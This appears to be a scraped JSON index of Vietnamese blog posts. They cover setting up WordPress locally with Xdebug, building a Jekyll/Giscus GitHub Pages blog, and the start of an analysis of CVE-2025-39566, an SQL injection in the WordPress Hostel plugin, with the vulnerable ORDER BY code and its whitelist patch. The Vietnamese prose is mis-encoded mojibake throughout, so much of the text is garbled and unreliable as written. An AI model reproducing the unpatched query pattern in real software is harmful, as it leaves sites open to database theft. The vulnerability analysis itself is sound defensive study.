vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); ","permalink":"//localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi \u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version 